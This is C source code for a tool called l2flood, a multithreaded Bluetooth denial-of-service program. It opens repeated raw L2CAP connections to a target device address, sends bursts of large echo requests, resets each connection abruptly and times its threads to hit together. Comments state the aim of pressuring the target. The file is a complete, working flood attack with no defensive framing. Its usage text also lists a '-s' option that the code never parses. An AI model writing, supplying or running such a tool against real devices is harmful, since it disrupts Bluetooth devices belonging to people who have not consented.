/* SPDX-License-Identifier: GPL-3.0-or-later
 * Copyright (c) 2026 Ivan Kovmir */

/* Includes */
#include <assert.h>
#include <err.h>
#include <errno.h>
#include <fcntl.h>
#include <getopt.h>
#include <poll.h>
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <sys/socket.h>
#include <sys/time.h>
#include <unistd.h>

#include <bluetooth/bluetooth.h>
#include <bluetooth/hci.h>
#include <bluetooth/hci_lib.h>
#include <bluetooth/l2cap.h>

/* Constants and Macros */
#ifdef _OPENMP
#include <omp.h>
#else
#error "OpenMP support missing."
#endif /* _OPENMP */

#ifndef __linux__
#warning "Unsupported operating system."
#endif /* __linux__ */

#define SEND_BUF_SIZE 600
#define BURST_LEN 50
#define THREAD_SYNC_DELAY_US 5000
#define CONNECTION_FAILED_DELAY_US 5000

#define CLOSE_SOCKET(socket_fd) do { \
    if ((socket_fd) != -1) { \
        close(socket_fd); \
        socket_fd = -1; \
    } \
} while (0)

/* Function prototypes */
static void flood_ping(char *target_baddr);
static inline void usage(void);

/* Global variables */
static bdaddr_t local_baddr; /* Local Bluetooth interface to attack from. */
static int num_threads;      /* Number of parallel workers. */

void
flood_ping(char *target_baddr)
{
	struct sockaddr_l2 addr;
	socklen_t optlen;
	int i, socket_fd;
	char send_buf[L2CAP_CMD_HDR_SIZE + SEND_BUF_SIZE];
	char str[18];
	int fd_opts;

	/* Socket options. */
	struct linger linger_opt = {1, 0};
	struct timeval snd_tv = {0, 300000}; /* 300ms */
	int reuse = 1;
	int sock_err;
	socklen_t sock_err_len;

	/* Initialize send buffer */
	for (i = 0; i < SEND_BUF_SIZE; i++)
		send_buf[L2CAP_CMD_HDR_SIZE + i] = (i % 40) + 'A';

	for (;;) {
		/* Create non-blocking socket so we can control connection
		 * attempt timeout; see below. */
		socket_fd = socket(PF_BLUETOOTH, SOCK_RAW|SOCK_NONBLOCK, BTPROTO_L2CAP);
		if (socket_fd < 0)
			errx(1, "Can't create socket");

		/* close() calls send RST immediately instead of graceful detach. */
		setsockopt(socket_fd, SOL_SOCKET,
				SO_LINGER, &linger_opt, sizeof(linger_opt));
		/* Don't care if Bluetooth is still processing requests. */
		setsockopt(socket_fd, SOL_SOCKET,
				SO_REUSEADDR, &reuse, sizeof(reuse));

		/* Bind to local address */
		memset(&addr, 0, sizeof(addr));
		addr.l2_family = AF_BLUETOOTH;
		bacpy(&addr.l2_bdaddr, &local_baddr);
		if (bind(socket_fd, (struct sockaddr *) &addr, sizeof(addr)) < 0)
			errx(1, "Can't bind socket");

		/* Connect to remote device */
		memset(&addr, 0, sizeof(addr));
		addr.l2_family = AF_BLUETOOTH;
		str2ba(target_baddr, &addr.l2_bdaddr);
		/* Rather than send a request and kindly wait for it
		 * to be served, we repeat the request if it
		 * has not been served quickly. This increases pressure. */
		errno = 0;
		/* Attempt the connection and discard the return value;
		 * rely on errno instead. */
		connect(socket_fd, (struct sockaddr *)&addr, sizeof(addr));
		if (errno != EINPROGRESS)
			goto connection_failed;

		/* Await connection for 1.5 seconds... */
		struct pollfd cpf = {socket_fd, POLLOUT, 0};
		if (poll(&cpf, 1, 1500) < 1)
			goto connection_failed;

		/* Any errors? */
		sock_err = 0;
		sock_err_len = sizeof(sock_err);
		getsockopt(socket_fd, SOL_SOCKET, SO_ERROR, &sock_err, &sock_err_len);
		if (sock_err != 0)
			goto connection_failed;

		/* Connected; switch back to blocking sends. */
		fd_opts = fcntl(socket_fd, F_GETFL, 0);
		if (fd_opts == -1)
			errx(1, "Can't request socket properties.");

		fcntl(socket_fd, F_SETFL, fd_opts & ~O_NONBLOCK);
		/* Set timeout on send() calls. */
		setsockopt(socket_fd, SOL_SOCKET, SO_SNDTIMEO, &snd_tv, sizeof(snd_tv));

		/* Get BT address of the local interface. */
		memset(&addr, 0, sizeof(addr));
		optlen = sizeof(addr);
		if (getsockname(socket_fd, (struct sockaddr *) &addr, &optlen) < 0)
			errx(1, "Can't get local address");
		ba2str(&addr.l2_bdaddr, str);

		printf("Thread %2d attacks %s from %s (data size %d) ...\n",
		       omp_get_thread_num(), target_baddr, str, SEND_BUF_SIZE);

		/* Send a lot of garbage. */
		for (i = 0; i < BURST_LEN; i++) {
			l2cap_cmd_hdr *send_cmd = (l2cap_cmd_hdr *) send_buf;
			send_cmd->ident = (uint8_t)rand();
			send_cmd->len   = htobs(SEND_BUF_SIZE);
			send_cmd->code  = L2CAP_ECHO_REQ;

			if (send(socket_fd, send_buf, L2CAP_CMD_HDR_SIZE + SEND_BUF_SIZE, 0) < 1)
				break; /* Whatever... Try again later. */
		}

		/* Abrupt disconnect. */
		CLOSE_SOCKET(socket_fd);
		/* Sync threads so they attack ~simultaneously. */
		usleep(THREAD_SYNC_DELAY_US);
		continue;

connection_failed:
		/* Clean-up. */
		CLOSE_SOCKET(socket_fd);
		/* Prevent the CPU from burning
		 * when the target is unreachable. */
		usleep(CONNECTION_FAILED_DELAY_US);
		continue;
	}
}

inline void
usage(void)
{
	printf("Usage:\n");
	printf("\tl2flood [-i device] [-s size] <bdaddr>\n");
}

int
main(int argc, char *argv[])
{
	int opt;

	/* Bind to any local Bluetooth interface by default. */
	bacpy(&local_baddr, BDADDR_ANY);
	/* A high number of workers is usually pointless,
	 * as is having more workers than CPUs. */
	num_threads = sysconf(_SC_NPROCESSORS_ONLN);
	if (num_threads > 4)
		num_threads = 4;

	while ((opt = getopt(argc,argv,"i:t:")) != EOF) {
		switch(opt) {
		/* Bluetooth interface. */
		case 'i':
			if (!strncasecmp(optarg, "hci", 3))
				hci_devba(atoi(optarg + 3), &local_baddr);
			else
				str2ba(optarg, &local_baddr);
			break;
		/* Number of parallel workers. */
		case 't':
			num_threads = atoi(optarg);
			break;
		default:
			usage();
			exit(1);
		}
	}

	if (!(argc - optind)) {
		usage(); /* No target given. */
		exit(1);
	}

#pragma omp parallel num_threads(num_threads)
	{
		flood_ping(argv[optind]);
	}

	return 0;
}
